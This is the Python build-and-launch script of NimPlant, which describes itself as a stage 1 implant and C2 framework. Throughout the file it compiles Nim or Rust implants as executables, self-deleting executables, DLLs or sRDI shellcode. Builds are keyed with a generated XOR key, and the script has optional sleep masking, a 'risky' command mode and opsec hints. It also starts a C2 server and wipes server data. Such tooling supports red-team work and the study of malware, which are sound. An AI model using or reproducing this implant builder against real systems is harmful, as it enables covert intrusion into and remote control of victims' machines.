#!/usr/bin/python3
# pylint: disable=import-outside-toplevel

"""
NimPlant - A light-weight stage 1 implant and C2 written in Nim|Rust and Python
By Cas van Cooten (@chvancooten)

This is a wrapper script to configure and generate NimPlant and its C2 server.
"""

import argparse
import os
import random
import sys
import time
import toml
from client.dist.srdi.ShellcodeRDI import ConvertToShellcode, HashFunctionName

# TODO: Fix CI/CD paths: https://github.com/chvancooten/NimPlant-private/actions/runs/9530913515/job/26271309362


def print_banner():
    """Print the NimPlant banner."""
    print(
        r"""
                  *    *(#    #             
                  **  **(##  ##             
         ########       (       ********    
        ####(###########************,****   
           # ########       ******** *      
           .###                   ***       
           .########         ********       
           ####    ###     ***    ****      
         ######### ###     *** *********    
       #######  ####  ## **  ****  *******  
       #####    ##      *      **    *****  
       ######  ####   ##***   **** .******  
       ###############     ***************  
            ##########     **********       
               #########**********          
                 #######********           
     _   _ _           ____  _             _   
    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_ 
    |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
    | |\  | | | | | | |  __/| | (_| | | | | |_ 
    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|                                  
                                                                                                  
        A light-weight stage 1 implant and C2 written in Nim|Rust and Python
        By Cas van Cooten (@chvancooten)
    """
    )


def get_xor_key(force_new=False):
    """Get the XOR key for pre-crypto operations."""
    if os.path.isfile(".xorkey") and not force_new:
        file = open(".xorkey", "r", encoding="utf-8")
        xor_key = int(file.read())
    else:
        print("Generating unique XOR key for pre-crypto operations...")
        print(
            "NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!"
        )
        xor_key = random.randint(0, 2147483647)
        with open(".xorkey", "w", encoding="utf-8") as file:
            file.write(str(xor_key))

    return xor_key


def shellcode_from_dll(lang, xor_key, config, debug=False):
    """Convert the DLL implant to shellcode using sRDI."""
    if lang == "nim":
        dll_path = "client/bin/NimPlant.dll"
        if debug:
            compile_function = compile_nim_debug
        else:
            compile_function = compile_nim
    elif lang == "rust":
        dll_path = "client-rs/bin/nimplant.dll"
        if debug:
            compile_function = compile_rust_debug
        else:
            compile_function = compile_rust

    if not os.path.isfile(dll_path):
        compile_function("dll", xor_key, config)
    else:
        # Compile a new DLL implant if no recent version exists
        file_mod_time = os.stat(dll_path).st_mtime
        last_time = (time.time() - file_mod_time) / 60

        if not last_time < 5:
            compile_function("dll", xor_key, config)

    # Convert DLL to PIC using sRDI
    with open(dll_path, "rb") as f:
        shellcode = ConvertToShellcode(f.read(), HashFunctionName("Update"), flags=0x4)

    with open(os.path.splitext(dll_path)[0] + ".bin", "wb") as f:
        f.write(shellcode)


def compile_implant(implant_type, binary_type, xor_key):
    """Compile the implant based on the specified type and binary type."""
    # Parse config for certain compile-time tasks
    config_path = os.path.abspath(
        os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
    )
    config = toml.load(config_path)

    match implant_type:
        case "nim":
            message = "NimPlant"
            compile_function = compile_nim
        case "nim-debug":
            message = "NimPlant with debugging enabled"
            compile_function = compile_nim_debug
        case "rust":
            message = "Rusty NimPlant"
            compile_function = compile_rust
        case "rust-debug":
            message = "Rusty NimPlant with debugging enabled"
            compile_function = compile_rust_debug

    if binary_type == "exe":
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key, config)
    elif binary_type == "exe-selfdelete":
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key, config)
    elif binary_type == "dll":
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key, config)
    elif binary_type == "raw" or binary_type == "bin":
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key, config)
    else:
        # Compile all
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key, config)
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key, config)
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key, config)
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key, config)


def compile_nim_debug(binary_type, xor_key, config):
    """Compile the Nim implant with debugging enabled."""
    if binary_type == "exe-selfdelete":
        print(
            "ERROR: Cannot compile self-deleting NimPlant with debugging enabled!\n"
            "Please test with the regular executable first, "
            "then compile the self-deleting version.\n"
            "Skipping this build..."
        )
        return

    compile_nim(binary_type, xor_key, config, debug=True)


def compile_nim(binary_type, xor_key, config, debug=False):
    """Compile the Nim implant."""
    # Construct compilation command
    if binary_type == "exe" or binary_type == "exe-selfdelete" or binary_type == "dll":
        compile_command = (
            "nim c -d:release -d:strip -d:noRes "
            + f"-d:xor_key={xor_key} --hints:off --warnings:off"
        )

        if debug:
            compile_command = compile_command + " -d:verbose"
        else:
            compile_command = compile_command + " --app:gui"

        if os.name != "nt":
            compile_command = compile_command + " -d=mingw"

        if binary_type == "exe":
            compile_command = compile_command + " -o:client/bin/NimPlant.exe"

        if binary_type == "exe-selfdelete":
            compile_command = (
                compile_command + " -o:client/bin/NimPlant-selfdelete.exe -d:selfdelete"
            )

        if binary_type == "dll":
            compile_command = (
                compile_command
                + " -o:client/bin/NimPlant.dll --app=lib --nomain -d:exportDll"
                + " --passL:-Wl,--dynamicbase --gc:orc"
            )

        # Sleep mask enabled only if defined in config.toml
        sleep_mask_enabled = config["nimplant"]["sleepMask"]
        if sleep_mask_enabled:
            compile_command = compile_command + " -d:sleepmask"

        # Allow risky commands only if defined in config.toml
        risky_mode = config["nimplant"]["riskyMode"]
        if risky_mode:
            compile_command = compile_command + " -d:risky"

        compile_command = compile_command + " client/NimPlant.nim"
        os.system(compile_command)

    elif binary_type == "raw":
        shellcode_from_dll("nim", xor_key, config, debug)


def compile_rust_debug(binary_type, xor_key, config):
    """Compile the Rust implant with debugging enabled."""
    compile_rust(binary_type, xor_key, config, debug=True)


def compile_rust(binary_type, xor_key, config, debug=False):
    """Compile the Rust implant."""
    # Construct compilation command
    target_path = "client-rs/target/"

    # We always use the GNU toolchain to prevent shellcode stability issues
    # If on Windows, the MSVC toolchain may be used instead (if the raw format is not used)
    compile_command = (
        "cargo build --manifest-path=client-rs/Cargo.toml -q "
        + "--target=x86_64-pc-windows-gnu"
    )

    # Get the output of `rustup show` to determine the toolchain
    rustup_show = os.popen("rustup show").read()
    if "x86_64-pc-windows-gnu" not in rustup_show:
        if binary_type == "raw":
            print(
                "WARNING: Generated shellcode may not work correctly when using MSVC toolchain.",
                "Please use the windows-gnu toolchain instead.",
            )

    if os.name != "nt":
        target_path = target_path + "x86_64-pc-windows-gnu/"

        # When cross-compiling, we need to tell sodiumoxide to use
        # a pre-compiled version libsodium (which is packaged)
        os.environ["SODIUM_LIB_DIR"] = os.path.abspath(
            os.path.join(os.path.dirname(sys.argv[0]), "client-rs/dist/")
        )

    if debug:
        target_path = target_path + "debug/"
    else:
        target_path = target_path + "release/"
        compile_command = compile_command + " --release"

    match binary_type:
        case "exe":
            target_path = target_path + "nimplant.exe"
            compile_command = compile_command + " --bin=nimplant"
        case "exe-selfdelete":
            # TODO: Exe-Selfdelete
            # TODO: Add to CI/CD as well
            print("RUST EXE-SELFDELETE NOT YET IMPLEMENTED.")
            exit(1)
        case "dll":
            target_path = target_path + "nimplant.dll"
            compile_command = compile_command + " --lib"
        case "raw":
            shellcode_from_dll("rust", xor_key, config, debug)
            return

    # Check if opsec profile has been applied
    try:
        with open(
            os.path.expanduser("~/.cargo/config.toml"), "r", encoding="utf-8"
        ) as f:
            opsec_enabled = "-Zlocation-detail=none" in f.read()
    except FileNotFoundError:
        opsec_enabled = False

    if not opsec_enabled:
        print("NOTE: Follow the tips in 'client-rs/Cargo.toml' for increased opsec.")

    # Sleep mask enabled only if defined in config.toml
    sleep_mask_enabled = config["nimplant"]["sleepMask"]
    if sleep_mask_enabled:
        # TODO: Sleep mask
        print("RUST SLEEP MASK NOT YET IMPLEMENTED.")
        exit(1)

    # Allow risky commands only if defined in config.toml
    risky_mode = config["nimplant"]["riskyMode"]
    if risky_mode:
        compile_command = compile_command + " --features=risky"

    os.system(compile_command)

    # Post-processing: move artifacts to `client-rs/bin`
    # We do this because --out-dir is considered unstable for some reason :(
    # https://doc.rust-lang.org/cargo/commands/cargo-build.html#output-options
    if binary_type != "raw":
        bin_path = f"client-rs/bin/{os.path.basename(target_path)}"

        if not os.path.exists("client-rs/bin"):
            os.makedirs("client-rs/bin")

        if os.path.exists(bin_path):
            os.remove(bin_path)

        os.rename(target_path, bin_path)


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Compile command
    compile_parser = subparsers.add_parser("compile", help="Compile the implant.")
    compile_parser.add_argument(
        "binary_type",
        choices=["exe", "exe-selfdelete", "dll", "raw", "bin", "all"],
        help="Type of binary to compile.",
    )
    compile_parser.add_argument(
        "implant_type",
        choices=["nim", "nim-debug", "rust", "rust-debug"],
        nargs="?",
        default="nim",
        help="Type of implant to compile.",
    )
    compile_parser.add_argument(
        "-r", "--rotatekey", action="store_true", help="Rotate the XOR key."
    )

    # Server command
    server_parser = subparsers.add_parser("server", help="Start the server.")
    server_parser.add_argument(
        "server_name", nargs="?", default="", help="Name of the server."
    )

    # Cleanup command
    subparsers.add_parser("cleanup", help="Clean up server files.")

    return parser.parse_args()


def main():
    """Main function for nimplant.py."""
    args = parse_args()
    print_banner()

    if not os.path.isfile("config.toml"):
        print(
            "ERROR: No configuration file found. Please create 'config.toml'",
            "based on the example configuration before use.",
        )
        exit(1)

    if args.command == "compile":
        xor_key = get_xor_key(args.rotatekey)
        compile_implant(args.implant_type, args.binary_type, xor_key)

        out_path = (
            "client-rs/bin" if args.implant_type.startswith("rust") else "client/bin"
        )
        print(f"Done compiling! You can find compiled binaries in '{out_path}'.")

    elif args.command == "server":
        from server.server import main as server_main

        xor_key = get_xor_key()
        try:
            name = sys.argv[2]
            server_main(xor_key, name)
        except IndexError:
            server_main(xor_key, "")

    elif args.command == "cleanup":
        from shutil import rmtree

        # Confirm if the user is sure they want to delete all files
        print(
            "WARNING: This will delete ALL NimPlant server data:",
            "Uploads/downloads, logs, and the database!",
            "Are you sure you want to continue? (y/n):",
            end=" ",
        )

        if input().lower() != "y":
            print("Aborting...")
            exit(0)

        print("Cleaning up...")

        try:
            # Clean up files
            for filepath in ["server/nimplant.db"]:
                if os.path.exists(filepath) and os.path.isfile(filepath):
                    os.remove(filepath)

            # Clean up directories
            for dirpath in [
                "server/downloads",
                "server/logs",
                "server/uploads",
            ]:
                if os.path.exists(dirpath) and os.path.isdir(dirpath):
                    rmtree(dirpath)

            print("Cleaned up NimPlant server files!")
        except OSError:
            print(
                "ERROR: Could not clean up all NimPlant server files.",
                "Do you have the right privileges?",
            )


if __name__ == "__main__":
    main()
